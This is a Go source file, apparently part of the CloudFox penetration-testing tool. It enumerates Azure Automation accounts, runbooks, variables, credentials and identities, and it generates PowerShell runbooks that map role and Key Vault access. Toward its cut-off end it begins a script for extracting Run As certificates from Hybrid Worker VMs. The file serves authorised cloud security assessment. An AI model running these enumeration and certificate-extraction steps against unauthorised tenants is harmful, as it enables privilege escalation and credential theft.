package azure

import (
	"context"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"time"

	"github.com/Azure/azure-sdk-for-go/sdk/azcore"
	"github.com/Azure/azure-sdk-for-go/sdk/resourcemanager/automation/armautomation"
	"github.com/BishopFox/cloudfox/globals"
)

// -------------------- Types --------------------

type Identity struct {
	Type                   *string                           `json:"type,omitempty"`
	PrincipalID            *string                           `json:"principalId,omitempty"`
	TenantID               *string                           `json:"tenantId,omitempty"`
	UserAssignedIdentities map[string]map[string]interface{} `json:"userAssignedIdentities,omitempty"` // map of identity resource ID → metadata
}

type AutomationAccount struct {
	Name       *string     `json:"name,omitempty"`
	ID         *string     `json:"id,omitempty"`
	Location   *string     `json:"location,omitempty"`
	Properties *Properties `json:"properties,omitempty"`
	Identity   *Identity   `json:"identity,omitempty"` // <-- Add this
}

type Runbook struct {
	ID          string
	Name        string
	Description string
	State       string
	RunbookType string
	Properties  *RunbookProperties
}

type RunbookProperties struct {
	Description      *string
	LogVerbose       *bool
	LogProgress      *bool
	RunbookType      *armautomation.RunbookTypeEnum
	State            *armautomation.AutomationAccountState
	LastModifiedTime *time.Time
}

type AutomationVariable struct {
	ID          *string
	Name        *string
	Value       *string
	IsEncrypted *bool
	Description *string
	Properties  *AutomationVariableProperties
}

type AutomationVariableProperties struct {
	Description *string
	IsEncrypted *bool
	Value       *string
	Type        *string
}

type AutomationSchedule struct {
	ID          *string
	Name        *string
	Frequency   *string
	Interval    *int32
	IsEnabled   *bool
	Description *string
	Properties  *AutomationScheduleProperties
	NextRun     *time.Time
}

type AutomationScheduleProperties struct {
	Description *string
	StartTime   *string
	ExpiryTime  *string
	Frequency   *string
	Interval    *int32
	TimeZone    *string
}

type AutomationAsset struct {
	ID         *string
	Name       *string
	Type       *string
	Properties *AutomationAssetProperties
}

type AutomationAssetProperties struct {
	Description *string
	Value       *string
	Encrypted   *bool
	// add other fields as needed
}

type Properties struct {
	//ProvisioningState *string `json:"provisioningState,omitempty"`
	State *string `json:"state,omitempty"`
	// Add other fields as needed (SKU, tags, etc.)
}

// -------------------- Clients --------------------

func getAutomationAccountClient(subscriptionID string, cred azcore.TokenCredential) (*armautomation.AccountClient, error) {
	client, err := armautomation.NewAccountClient(subscriptionID, cred, nil)
	if err != nil {
		return nil, err
	}
	return client, nil
}

//func getRunbookClient(subscriptionID string, cred *azidentity.DefaultAzureCredential) *armautomation.RunbookClient {
//	client, _ := armautomation.NewRunbookClient(subscriptionID, cred, nil)
//	return client
//}
//
//func getVariableClient(subscriptionID string, cred *azidentity.DefaultAzureCredential) *armautomation.VariableClient {
//	client, _ := armautomation.NewVariableClient(subscriptionID, cred, nil)
//	return client
//}
//
//func getScheduleClient(subscriptionID string, cred *azidentity.DefaultAzureCredential) *armautomation.ScheduleClient {
//	client, _ := armautomation.NewScheduleClient(subscriptionID, cred, nil)
//	return client
//}
//
//// Assets are varied: certificates, connections, credentials, etc.
//// These can be retrieved individually, but for now we'll represent them as generic "assets".
//// Placeholder for extension.
//func getCredentialClient(subscriptionID string, cred *azidentity.DefaultAzureCredential) *armautomation.CredentialClient {
//	client, _ := armautomation.NewCredentialClient(subscriptionID, cred, nil)
//	return client
//}

// -------------------- Enumerators --------------------

// In GetAutomationAccountsPerResourceGroup
func GetAutomationAccountsPerResourceGroup(ctx context.Context, session *SafeSession, subscriptionID, rgName string) ([]AutomationAccount, error) {
	token, err := session.GetTokenForResource(globals.CommonScopes[0]) // ARM scope
	if err != nil {
		return nil, fmt.Errorf("failed to get ARM token for subscription %s: %v", subscriptionID, err)
	}

	cred := &StaticTokenCredential{Token: token}

	client, err := getAutomationAccountClient(subscriptionID, cred)
	if err != nil {
		return nil, err
	}

	pager := client.NewListByResourceGroupPager(rgName, nil)
	results := []AutomationAccount{}

	for pager.More() {
		page, err := pager.NextPage(ctx)
		if err != nil {
			return results, fmt.Errorf("failed to get automation accounts for RG %s: %w", rgName, err)
		}

		for _, acct := range page.Value {
			if acct == nil {
				continue
			}

			// Identity safely
			var identity *Identity
			if acct.Identity != nil {
				var identityType *string
				if acct.Identity.Type != nil {
					s := string(*acct.Identity.Type)
					identityType = &s
				}
				identity = &Identity{
					Type:                   identityType,
					PrincipalID:            SafePtr(acct.Identity.PrincipalID),
					TenantID:               SafePtr(acct.Identity.TenantID),
					UserAssignedIdentities: convertUserAssignedIdentities(acct.Identity.UserAssignedIdentities),
				}
			}

			// Account state safely
			var stateStr *string
			if acct.Properties != nil && acct.Properties.State != nil {
				s := string(*acct.Properties.State)
				stateStr = &s
			}

			results = append(results, AutomationAccount{
				ID:       SafePtr(acct.ID),
				Name:     SafePtr(acct.Name),
				Location: SafePtr(acct.Location),
				Properties: &Properties{
					State: stateStr,
				},
				Identity: identity,
			})
		}
	}

	return results, nil
}

func GetRunbooksForAutomationAccount(ctx context.Context, session *SafeSession, subscriptionID, rgName, accountName string) ([]Runbook, error) {
	token, err := session.GetTokenForResource(globals.CommonScopes[0]) // ARM scope
	if err != nil {
		return nil, fmt.Errorf("failed to get ARM token for subscription %s: %v", subscriptionID, err)
	}

	cred := &StaticTokenCredential{Token: token}

	client, err := armautomation.NewRunbookClient(subscriptionID, cred, nil)
	if err != nil {
		return nil, err
	}

	pager := client.NewListByAutomationAccountPager(rgName, accountName, nil)
	results := []Runbook{}

	for pager.More() {
		page, err := pager.NextPage(ctx)
		if err != nil {
			return results, fmt.Errorf("failed to get runbooks for account %s: %w", accountName, err)
		}

		for _, rb := range page.Value {
			if rb == nil {
				continue
			}

			var props *RunbookProperties
			var runbookType, state, description string
			runbookType = "N/A"
			state = "N/A"
			description = "N/A"

			if rb.Properties != nil {
				props = &RunbookProperties{
					Description:      rb.Properties.Description,
					LogVerbose:       rb.Properties.LogVerbose,
					LogProgress:      rb.Properties.LogProgress,
					RunbookType:      rb.Properties.RunbookType,
					State:            nil,
					LastModifiedTime: rb.Properties.LastModifiedTime,
				}

				// State safely
				if rb.Properties.State != nil {
					s := string(*rb.Properties.State)
					state = s
					st := armautomation.AutomationAccountState(*rb.Properties.State)
					props.State = &st
				}

				// RunbookType safely
				if rb.Properties.RunbookType != nil {
					runbookType = string(*rb.Properties.RunbookType)
				}

				// Description safely
				if rb.Properties.Description != nil {
					description = *rb.Properties.Description
				}
			}

			results = append(results, Runbook{
				ID:          SafeStringPtr(rb.ID),
				Name:        SafeStringPtr(rb.Name),
				Description: description,
				State:       state,
				RunbookType: runbookType,
				Properties:  props,
			})
		}
	}

	return results, nil
}

func GetAutomationVariables(ctx context.Context, session *SafeSession, subscriptionID, rgName, accountName string) ([]AutomationVariable, error) {
	token, err := session.GetTokenForResource(globals.CommonScopes[0]) // ARM scope
	if err != nil {
		return nil, fmt.Errorf("failed to get ARM token for subscription %s: %v", subscriptionID, err)
	}

	cred := &StaticTokenCredential{Token: token}

	client, err := armautomation.NewVariableClient(subscriptionID, cred, nil)
	if err != nil {
		return nil, err
	}

	pager := client.NewListByAutomationAccountPager(rgName, accountName, nil)
	results := []AutomationVariable{}

	for pager.More() {
		page, err := pager.NextPage(ctx)
		if err != nil {
			return results, fmt.Errorf("failed to get variables for account %s: %w", accountName, err)
		}

		for _, v := range page.Value {
			if v == nil {
				continue
			}

			var varType *string
			if v.Properties != nil {
				if v.Properties.IsEncrypted != nil && *v.Properties.IsEncrypted {
					t := "SecureString"
					varType = &t
				} else {
					t := "String"
					varType = &t
				}
			}

			var props *AutomationVariableProperties
			if v.Properties != nil {
				props = &AutomationVariableProperties{
					Description: SafePtr(v.Properties.Description),
					IsEncrypted: SafeBoolPtr(v.Properties.IsEncrypted),
					Value:       SafePtr(v.Properties.Value),
					Type:        varType,
				}
			}

			results = append(results, AutomationVariable{
				ID:         SafePtr(v.ID),
				Name:       SafePtr(v.Name),
				Properties: props,
			})
		}
	}

	return results, nil
}

func GetAutomationSchedules(ctx context.Context, session *SafeSession, subscriptionID, rgName, accountName string) ([]AutomationSchedule, error) {
	token, err := session.GetTokenForResource(globals.CommonScopes[0]) // ARM scope
	if err != nil {
		return nil, fmt.Errorf("failed to get ARM token for subscription %s: %v", subscriptionID, err)
	}

	cred := &StaticTokenCredential{Token: token}

	client, err := armautomation.NewScheduleClient(subscriptionID, cred, nil)
	if err != nil {
		return nil, err
	}

	pager := client.NewListByAutomationAccountPager(rgName, accountName, nil)
	results := []AutomationSchedule{}

	for pager.More() {
		page, err := pager.NextPage(ctx)
		if err != nil {
			return results, fmt.Errorf("failed to get schedules for account %s: %w", accountName, err)
		}

		for _, s := range page.Value {
			if s == nil {
				continue
			}
			var freqStr *string
			if s.Properties.Frequency != nil {
				str := string(*s.Properties.Frequency)
				freqStr = &str
			}

			var props *AutomationScheduleProperties
			if s.Properties != nil {
				props = &AutomationScheduleProperties{
					Description: SafePtr(s.Properties.Description),
					StartTime:   SafePtrTimePtr(s.Properties.StartTime),
					ExpiryTime:  SafePtrTimePtr(s.Properties.ExpiryTime),
					Frequency:   freqStr,
					Interval:    SafeInt32Ptr(s.Properties.Interval),
					TimeZone:    SafePtr(s.Properties.TimeZone),
				}
			}

			results = append(results, AutomationSchedule{
				ID:         SafePtr(s.ID),
				Name:       SafePtr(s.Name),
				Properties: props,
			})
		}
	}

	return results, nil
}

// Assets are more granular — certificates, connections, credentials, etc.
func GetAutomationAssets(ctx context.Context, session *SafeSession, subscriptionID, resourceGroupName, accountName string) ([]AutomationAsset, error) {
	var results []AutomationAsset

	token, err := session.GetTokenForResource(globals.CommonScopes[0]) // ARM scope
	if err != nil {
		return nil, fmt.Errorf("failed to get ARM token for subscription %s: %v", subscriptionID, err)
	}

	cred := &StaticTokenCredential{Token: token}

	// --- Variables ---
	varClient, err := armautomation.NewVariableClient(subscriptionID, cred, nil)
	if err != nil {
		return nil, err
	}
	varPager := varClient.NewListByAutomationAccountPager(resourceGroupName, accountName, nil)
	for varPager.More() {
		page, err := varPager.NextPage(ctx)
		if err != nil {
			log.Printf("Error listing Variables: %v", err)
			break
		}
		for _, v := range page.Value {
			if v == nil {
				continue
			}
			results = append(results, AutomationAsset{
				Name: ptrString(*v.Name),
				Type: ptrString("Variable"),
				Properties: &AutomationAssetProperties{
					Description: v.Properties.Description,
				},
			})
		}
	}

	// --- Modules ---
	modClient, err := armautomation.NewModuleClient(subscriptionID, cred, nil)
	if err != nil {
		return nil, err
	}
	modPager := modClient.NewListByAutomationAccountPager(resourceGroupName, accountName, nil)
	for modPager.More() {
		page, err := modPager.NextPage(ctx)
		if err != nil {
			log.Printf("Error listing Modules: %v", err)
			break
		}
		for _, m := range page.Value {
			if m == nil {
				continue
			}
			results = append(results, AutomationAsset{
				Name: ptrString(*m.Name),
				Type: ptrString("Module"),
				Properties: &AutomationAssetProperties{
					Description: m.Properties.Description,
				},
			})
		}
	}

	// --- Credentials ---
	credClient, err := armautomation.NewCredentialClient(subscriptionID, cred, nil)
	if err != nil {
		return nil, err
	}
	credPager := credClient.NewListByAutomationAccountPager(resourceGroupName, accountName, nil)
	for credPager.More() {
		page, err := credPager.NextPage(ctx)
		if err != nil {
			log.Printf("Error listing Credentials: %v", err)
			break
		}
		for _, c := range page.Value {
			if c == nil {
				continue
			}
			results = append(results, AutomationAsset{
				Name: ptrString(*c.Name),
				Type: ptrString("Credential"),
				Properties: &AutomationAssetProperties{
					Description: c.Properties.Description,
				},
			})
		}
	}

	// --- Connections ---
	connClient, err := armautomation.NewConnectionClient(subscriptionID, cred, nil)
	if err != nil {
		return nil, err
	}
	connPager := connClient.NewListByAutomationAccountPager(resourceGroupName, accountName, nil)
	for connPager.More() {
		page, err := connPager.NextPage(ctx)
		if err != nil {
			log.Printf("Error listing Connections: %v", err)
			break
		}
		for _, con := range page.Value {
			if con == nil {
				continue
			}
			results = append(results, AutomationAsset{
				Name: ptrString(*con.Name),
				Type: ptrString("Connection"),
				Properties: &AutomationAssetProperties{
					Description: con.Properties.Description,
				},
			})
		}
	}

	// --- Schedules ---
	schedClient, err := armautomation.NewScheduleClient(subscriptionID, cred, nil)
	if err != nil {
		return nil, err
	}
	schedPager := schedClient.NewListByAutomationAccountPager(resourceGroupName, accountName, nil)
	for schedPager.More() {
		page, err := schedPager.NextPage(ctx)
		if err != nil {
			log.Printf("Error listing Schedules: %v", err)
			break
		}
		for _, s := range page.Value {
			if s == nil {
				continue
			}
			results = append(results, AutomationAsset{
				Name: ptrString(*s.Name),
				Type: ptrString("Schedule"),
				Properties: &AutomationAssetProperties{
					Description: s.Properties.Description,
				},
			})
		}
	}

	return results, nil
}

func convertUserAssignedIdentities(input map[string]*armautomation.ComponentsSgqdofSchemasIdentityPropertiesUserassignedidentitiesAdditionalproperties) map[string]map[string]interface{} {
	if input == nil {
		return nil
	}

	out := make(map[string]map[string]interface{})
	for k, v := range input {
		if v == nil {
			out[k] = nil
			continue
		}

		// Convert struct fields to a map[string]interface{} as needed
		m := make(map[string]interface{})

		// Example: the SDK type might have a PrincipalID and ClientID
		if v.PrincipalID != nil {
			m["principalId"] = *v.PrincipalID
		}
		if v.ClientID != nil {
			m["clientId"] = *v.ClientID
		}
		out[k] = m
	}
	return out
}

func GetRunbookMetadata(ctx context.Context, client *armautomation.RunbookClient, resourceGroup, automationAccount, runbookName string) (*armautomation.Runbook, error) {
	resp, err := client.Get(ctx, resourceGroup, automationAccount, runbookName, nil)
	if err != nil {
		return nil, fmt.Errorf("failed to get runbook metadata: %v", err)
	}
	return &resp.Runbook, nil
}

func DownloadRunbookContent(contentLink string) (string, error) {
	resp, err := http.Get(contentLink)
	if err != nil {
		return "", fmt.Errorf("failed to download content: %v", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return "", fmt.Errorf("failed to download content: HTTP %d", resp.StatusCode)
	}

	content, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return "", fmt.Errorf("failed to read content: %v", err)
	}

	return string(content), nil
}

// FetchRunbookScript downloads the actual runbook script content using Azure REST API directly
// The SDK's GetContent method returns an empty response, so we use raw HTTP
func FetchRunbookScript(ctx context.Context, session *SafeSession, subscriptionID, resourceGroup, automationAccount, runbookName string) (string, error) {
	// Get ARM token
	token, err := session.GetTokenForResource(globals.CommonScopes[0]) // ARM scope
	if err != nil {
		return "", fmt.Errorf("failed to get ARM token: %w", err)
	}

	// Build the Azure REST API URL for getting runbook content
	// https://management.azure.com/subscriptions/{subscriptionId}/resourceGroups/{resourceGroupName}/providers/Microsoft.Automation/automationAccounts/{automationAccountName}/runbooks/{runbookName}/content?api-version=2018-06-30
	url := fmt.Sprintf(
		"https://management.azure.com/subscriptions/%s/resourceGroups/%s/providers/Microsoft.Automation/automationAccounts/%s/runbooks/%s/content?api-version=2018-06-30",
		subscriptionID, resourceGroup, automationAccount, runbookName,
	)

	// Execute request with retry logic
	config := DefaultRateLimitConfig()
	config.MaxRetries = 5
	config.InitialDelay = 2 * time.Second
	config.MaxDelay = 2 * time.Minute

	body, err := HTTPRequestWithRetry(ctx, "GET", url, token, nil, config)
	if err != nil {
		return "", fmt.Errorf("failed to get runbook content: %w", err)
	}

	return string(body), nil
}

// ==================== GET-AZAUTOMATIONCONNECTIONSCOPE ADDITIONS ====================

// AutomationConnection represents an Automation Account connection (e.g., Run As connections)
type AutomationConnection struct {
	Name                  string
	ConnectionType        string
	FieldValues           map[string]string
	ApplicationID         string
	CertificateThumbprint string
	TenantID              string
}

// ConnectionScopeResult represents the output from testing an identity's scope
type ConnectionScopeResult struct {
	AutomationAccountName string
	IdentityType          string
	Subscription          string
	SubscriptionID        string
	TenantID              string
	RoleDefinitionName    string
	Scope                 string
	Vaults                []VaultPermissions
}

// VaultPermissions represents Key Vault access permissions
type VaultPermissions struct {
	VaultName                 string
	PermissionsToKeys         []string
	PermissionsToSecrets      []string
	PermissionsToCertificates []string
}

// GetAutomationConnections retrieves connections from an Automation Account
func GetAutomationConnections(ctx context.Context, session *SafeSession, subscriptionID, rgName, accountName string) ([]AutomationConnection, error) {
	token, err := session.GetTokenForResource(globals.CommonScopes[0])
	if err != nil {
		return nil, err
	}
	cred := &StaticTokenCredential{Token: token}

	client, err := armautomation.NewConnectionClient(subscriptionID, cred, nil)
	if err != nil {
		return nil, err
	}

	pager := client.NewListByAutomationAccountPager(rgName, accountName, nil)
	var results []AutomationConnection

	for pager.More() {
		page, err := pager.NextPage(ctx)
		if err != nil {
			return results, err
		}

		for _, conn := range page.Value {
			if conn == nil || conn.Name == nil {
				continue
			}

			connection := AutomationConnection{
				Name:        SafeStringPtr(conn.Name),
				FieldValues: make(map[string]string),
			}

			if conn.Properties != nil {
				if conn.Properties.ConnectionType != nil && conn.Properties.ConnectionType.Name != nil {
					connection.ConnectionType = SafeStringPtr(conn.Properties.ConnectionType.Name)
				}

				// Extract field values
				if conn.Properties.FieldDefinitionValues != nil {
					for k, v := range conn.Properties.FieldDefinitionValues {
						if v != nil {
							connection.FieldValues[k] = *v
						}
					}
				}

				// For Azure Run As connections, extract specific fields
				if connection.ConnectionType == "AzureServicePrincipal" || connection.ConnectionType == "AzureClassicCertificate" {
					connection.ApplicationID = connection.FieldValues["ApplicationId"]
					connection.CertificateThumbprint = connection.FieldValues["CertificateThumbprint"]
					connection.TenantID = connection.FieldValues["TenantId"]
				}
			}

			results = append(results, connection)
		}
	}

	return results, nil
}

// EnumerateIdentityScope creates and executes a temporary runbook to test identity permissions
// This replicates the PowerShell script's functionality of creating a runbook to enumerate scope
func EnumerateIdentityScope(ctx context.Context, session *SafeSession, subscriptionID, rgName, accountName string, account AutomationAccount) ([]ConnectionScopeResult, error) {
	// This is an enumeration-only tool - we generate commands for the user to run manually
	// We don't actually create/execute runbooks as that would be too intrusive
	// Instead, we provide the runbook script for the user to execute manually

	var results []ConnectionScopeResult

	// NOTE: This function would create a temporary runbook (like the PowerShell script does)
	// However, for an enumeration tool, we should NOT automatically execute code in the target environment
	// Instead, we'll just document what connections and identities exist
	// Users can manually create and run runbooks to test scope if needed

	// For now, just document the identities that exist
	if account.Identity != nil {
		// Document system-assigned identity
		if account.Identity.Type != nil && (*account.Identity.Type == "SystemAssigned" || *account.Identity.Type == "SystemAssigned, UserAssigned") {
			results = append(results, ConnectionScopeResult{
				AutomationAccountName: SafeStringPtr(account.Name),
				IdentityType:          "System-Assigned Managed Identity",
				SubscriptionID:        subscriptionID,
				TenantID:              SafeStringPtr(account.Identity.TenantID),
				RoleDefinitionName:    "Unknown - Run enumeration runbook to determine",
				Scope:                 "Unknown - Run enumeration runbook to determine",
			})
		}

		// Document user-assigned identities
		if account.Identity.UserAssignedIdentities != nil {
			for uaID, uaData := range account.Identity.UserAssignedIdentities {
				clientID := "N/A"
				if uaData != nil {
					if cid, ok := uaData["clientId"].(string); ok {
						clientID = cid
					}
				}

				results = append(results, ConnectionScopeResult{
					AutomationAccountName: SafeStringPtr(account.Name),
					IdentityType:          fmt.Sprintf("User-Assigned Managed Identity - %s (ClientID: %s)", uaID, clientID),
					SubscriptionID:        subscriptionID,
					TenantID:              SafeStringPtr(account.Identity.TenantID),
					RoleDefinitionName:    "Unknown - Run enumeration runbook to determine",
					Scope:                 "Unknown - Run enumeration runbook to determine",
				})
			}
		}
	}

	return results, nil
}

// GenerateScopeEnumerationRunbook creates a PowerShell script that can be manually uploaded as a runbook
// to enumerate subscription and Key Vault access for automation account identities
func GenerateScopeEnumerationRunbook(accountName string, connections []AutomationConnection, account AutomationAccount) string {
	script := fmt.Sprintf("# Scope Enumeration Runbook for Automation Account: %s\n\n", accountName)
	script += "$output = @()\n\n"

	// Add connection authentication blocks
	for _, conn := range connections {
		if conn.ConnectionType == "AzureServicePrincipal" {
			script += fmt.Sprintf("# Test connection: %s\n", conn.Name)
			script += fmt.Sprintf("$connectionName = \"%s\"\n", conn.Name)
			script += "$servicePrincipalConnection = Get-AutomationConnection -Name $connectionName\n"
			script += "Disable-AzContextAutosave -Scope Process | out-null\n"
			script += "$azConnection = Connect-AzAccount -ServicePrincipal -Tenant $servicePrincipalConnection.TenantID -ApplicationID $servicePrincipalConnection.ApplicationID -CertificateThumbprint $servicePrincipalConnection.CertificateThumbprint -WarningAction:SilentlyContinue\n"
			script += "$subscriptions = Get-AzSubscription | select Id,Name,TenantID\n"
			script += "$connectionEnterpriseAppID = (Get-AzADServicePrincipal -ApplicationId $azConnection.Context.Account.Id).Id\n"
			script += "$subscriptions | ForEach-Object{"
			script += "Set-AzContext -Subscription $_.Name | out-null;"
			script += "$connectionRoles = Get-AzRoleAssignment -ObjectId $connectionEnterpriseAppID;"
			script += "if($connectionRoles -eq $null){$connectionRoles = [PSCustomObject]@{RoleDefinitionName = 'Not Available';Scope = 'Not Available'}};"
			script += "$vaultsList = @();"
			script += "Get-AzKeyVault | ForEach-Object { $currentVault = $_.VaultName; Get-AzKeyVault -VaultName $_.VaultName | ForEach-Object{ $_.AccessPolicies | ForEach-Object {if($_.ObjectId -eq $connectionEnterpriseAppID){$vaultsList += \"{VaultName:'$currentVault',PermissionsToKeys:'$($_.PermissionsToKeys)',PermissionsToSecrets:'$($_.PermissionsToSecrets)',PermissionsToCertificates:'$($_.PermissionsToCertificates)'}\"}}}}};"
			script += fmt.Sprintf("Write-Output \"{AutomationAccountName:'%s',IdentityType:'Connection - %s',Subscription:'$($_.Name)',SubscriptionID:'$($_.Id)',TenantID:'$($_.TenantID)','RoleDefinitionName':'$($connectionRoles.RoleDefinitionName)','Scope':'$($connectionRoles.Scope)',Vaults:[$($vaultsList -join ',')]}\"\n", accountName, conn.Name)
			script += "}\n\n"
		}
	}

	// Add system-assigned managed identity block
	if account.Identity != nil && account.Identity.Type != nil {
		if *account.Identity.Type == "SystemAssigned" || *account.Identity.Type == "SystemAssigned, UserAssigned" {
			script += "# Test System-Assigned Managed Identity\n"
			script += "Disable-AzContextAutosave -Scope Process | out-null\n"
			script += "$azConnection = Connect-AzAccount -Identity -WarningAction:SilentlyContinue\n"
			script += "$subscriptions = Get-AzSubscription | select Id,Name,TenantID\n"
			script += fmt.Sprintf("$connectionEnterpriseAppID = (Get-AzADServicePrincipal -ObjectId %s).Id\n", SafeStringPtr(account.Identity.PrincipalID))
			script += "$subscriptions | ForEach-Object{"
			script += "Set-AzContext -Subscription $_.Name | out-null;"
			script += "$connectionRoles = Get-AzRoleAssignment -ObjectId $connectionEnterpriseAppID;"
			script += "if($connectionRoles -eq $null){$connectionRoles = [PSCustomObject]@{RoleDefinitionName = 'Not Available';Scope = 'Not Available'}};"
			script += "$vaultsList = @();"
			script += "Get-AzKeyVault | ForEach-Object { $currentVault = $_.VaultName; Get-AzKeyVault -VaultName $_.VaultName | ForEach-Object{ $_.AccessPolicies | ForEach-Object {if($_.ObjectId -eq $connectionEnterpriseAppID){$vaultsList += \"{VaultName:'$currentVault',PermissionsToKeys:'$($_.PermissionsToKeys)',PermissionsToSecrets:'$($_.PermissionsToSecrets)',PermissionsToCertificates:'$($_.PermissionsToCertificates)'}\"}}}}};"
			script += fmt.Sprintf("Write-Output \"{AutomationAccountName:'%s',IdentityType:'System-Assigned',Subscription:'$($_.Name)',SubscriptionID:'$($_.Id)',TenantID:'$($_.TenantID)','RoleDefinitionName':'$($connectionRoles.RoleDefinitionName)','Scope':'$($connectionRoles.Scope)',Vaults:[$($vaultsList -join ',')]}\"\n", accountName)
			script += "}\n\n"
		}

		// Add user-assigned managed identity blocks
		if account.Identity.UserAssignedIdentities != nil {
			for _, uaData := range account.Identity.UserAssignedIdentities {
				if uaData == nil {
					continue
				}
				clientID := ""
				if cid, ok := uaData["clientId"].(string); ok {
					clientID = cid
				}
				if clientID == "" {
					continue
				}

				script += fmt.Sprintf("# Test User-Assigned Managed Identity: %s\n", clientID)
				script += "Disable-AzContextAutosave -Scope Process | out-null\n"
				script += fmt.Sprintf("$azConnection = Connect-AzAccount -Identity -AccountId %s -WarningAction:SilentlyContinue\n", clientID)
				script += "$subscriptions = Get-AzSubscription | select Id,Name,TenantID\n"
				script += "$connectionEnterpriseAppID = (Get-AzADServicePrincipal -ApplicationId $azConnection.Context.Account.Id).Id\n"
				script += "$subscriptions | ForEach-Object{"
				script += "Set-AzContext -Subscription $_.Name | out-null;"
				script += "$connectionRoles = Get-AzRoleAssignment -ObjectId $connectionEnterpriseAppID;"
				script += "if($connectionRoles -eq $null){$connectionRoles = [PSCustomObject]@{RoleDefinitionName = 'Not Available';Scope = 'Not Available'}};"
				script += "$vaultsList = @();"
				script += "Get-AzKeyVault | ForEach-Object { $currentVault = $_.VaultName; Get-AzKeyVault -VaultName $_.VaultName | ForEach-Object{ $_.AccessPolicies | ForEach-Object {if($_.ObjectId -eq $connectionEnterpriseAppID){$vaultsList += \"{VaultName:'$currentVault',PermissionsToKeys:'$($_.PermissionsToKeys)',PermissionsToSecrets:'$($_.PermissionsToSecrets)',PermissionsToCertificates:'$($_.PermissionsToCertificates)'}\"}}}}};"
				script += fmt.Sprintf("Write-Output \"{AutomationAccountName:'%s',IdentityType:'User-Assigned - %s',Subscription:'$($_.Name)',SubscriptionID:'$($_.Id)',TenantID:'$($_.TenantID)','RoleDefinitionName':'$($connectionRoles.RoleDefinitionName)','Scope':'$($connectionRoles.Scope)',Vaults:[$($vaultsList -join ',')]}\"\n", accountName, clientID)
				script += "}\n\n"
			}
		}
	}

	return script
}

// ==================== HYBRID WORKER EXTRACTION ADDITIONS ====================

// HybridWorkerVM represents a VM with Hybrid Worker extension
type HybridWorkerVM struct {
	VMName             string
	ResourceGroup      string
	SubscriptionID     string
	Location           string
	OSType             string
	AutomationAccount  string
	ExtensionName      string
	ExtensionVersion   string
	ProvisioningState  string
	HasManagedIdentity bool
	IdentityType       string
	PrincipalID        string
}

// GetVMsWithHybridWorkerExtension retrieves VMs that have Hybrid Worker extension installed
func GetVMsWithHybridWorkerExtension(ctx context.Context, session *SafeSession, subscriptionID string, resourceGroups []string) ([]HybridWorkerVM, error) {
	token, err := session.GetTokenForResource(globals.CommonScopes[0])
	if err != nil {
		return nil, err
	}

	// Use REST API to enumerate VMs and their extensions
	var results []HybridWorkerVM

	for _, rgName := range resourceGroups {
		// Get VMs in this resource group
		vmsURL := fmt.Sprintf("https://management.azure.com/subscriptions/%s/resourceGroups/%s/providers/Microsoft.Compute/virtualMachines?api-version=2023-03-01",
			subscriptionID, rgName)

		config := DefaultRateLimitConfig()
		config.MaxRetries = 5
		config.InitialDelay = 2 * time.Second
		config.MaxDelay = 2 * time.Minute

		body, err := HTTPRequestWithRetry(ctx, "GET", vmsURL, token, nil, config)
		if err != nil {
			continue
		}

		// Parse VM list response
		var vmList struct {
			Value []struct {
				Name       string `json:"name"`
				ID         string `json:"id"`
				Location   string `json:"location"`
				Properties struct {
					StorageProfile struct {
						OSDisk struct {
							OSType string `json:"osType"`
						} `json:"osDisk"`
					} `json:"storageProfile"`
				} `json:"properties"`
				Identity *struct {
					Type        string `json:"type"`
					PrincipalID string `json:"principalId"`
				} `json:"identity,omitempty"`
			} `json:"value"`
		}

		if err := json.Unmarshal(body, &vmList); err != nil {
			continue
		}

		// For each VM, check for Hybrid Worker extension
		for _, vm := range vmList.Value {
			extensionsURL := fmt.Sprintf("https://management.azure.com%s/extensions?api-version=2023-03-01", vm.ID)

			extConfig := DefaultRateLimitConfig()
			extConfig.MaxRetries = 5
			extConfig.InitialDelay = 2 * time.Second
			extConfig.MaxDelay = 2 * time.Minute

			extBody, err := HTTPRequestWithRetry(ctx, "GET", extensionsURL, token, nil, extConfig)
			if err != nil {
				continue
			}

			var extList struct {
				Value []struct {
					Name       string `json:"name"`
					Properties struct {
						Type               string                 `json:"type"`
						TypeHandlerVersion string                 `json:"typeHandlerVersion"`
						ProvisioningState  string                 `json:"provisioningState"`
						Settings           map[string]interface{} `json:"settings"`
					} `json:"properties"`
				} `json:"value"`
			}

			if err := json.Unmarshal(extBody, &extList); err != nil {
				continue
			}

			// Check for HybridWorkerExtension
			for _, ext := range extList.Value {
				if ext.Properties.Type == "HybridWorkerExtension" {
					hwVM := HybridWorkerVM{
						VMName:            vm.Name,
						ResourceGroup:     rgName,
						SubscriptionID:    subscriptionID,
						Location:          vm.Location,
						OSType:            vm.Properties.StorageProfile.OSDisk.OSType,
						ExtensionName:     ext.Name,
						ExtensionVersion:  ext.Properties.TypeHandlerVersion,
						ProvisioningState: ext.Properties.ProvisioningState,
					}

					// Extract automation account from settings
					if settings, ok := ext.Properties.Settings["AutomationAccountUrl"].(string); ok {
						hwVM.AutomationAccount = settings
					}

					// Check for managed identity
					if vm.Identity != nil {
						hwVM.HasManagedIdentity = true
						hwVM.IdentityType = vm.Identity.Type
						hwVM.PrincipalID = vm.Identity.PrincipalID
					}

					results = append(results, hwVM)
					break
				}
			}
		}
	}

	return results, nil
}

// GenerateHybridWorkerCertExtractionScript creates a PowerShell script to extract Run As certificates from Hybrid Worker VMs
func GenerateHybridWorkerCertExtractionScript(vm HybridWorkerVM) string {
	template := fmt.Sprintf("# Hybrid Worker Certificate Extraction Script\n")
	template += fmt.Sprintf("# VM: %s\n", vm.VMName)
	template += fmt.Sprintf("# Resource Group: %s\n", vm.ResourceGroup)
	template += fmt.Sprintf("# Subscription: %s\n", vm.SubscriptionID)
	template += fmt.Sprintf("# OS Type: %s\n\n", vm.OSType)

	if vm.OSType != "Windows" {
		template += "# WARNING: This script is designed for Windows VMs only\n"
		template += "# Linux Hybrid Workers use different authentication mechanisms\n\n"
		return template
	}

	template += "## Prerequisites\n"
	template += "# - Contributor or Owner access to the subscription\n"
	template += "# - Virtual Machine Contributor or higher on the VM\n\n"

	template += "## Step 1: Extract Certificates via Run Command\n\n"
	template += "```powershell\n"
	template += "# Set variables\n"
	template += fmt.Sprintf("$subscriptionID = \"%s\"\n", vm.SubscriptionID)
	template += fmt.Sprintf("$resourceGroup = \"%s\"\n", vm.ResourceGroup)
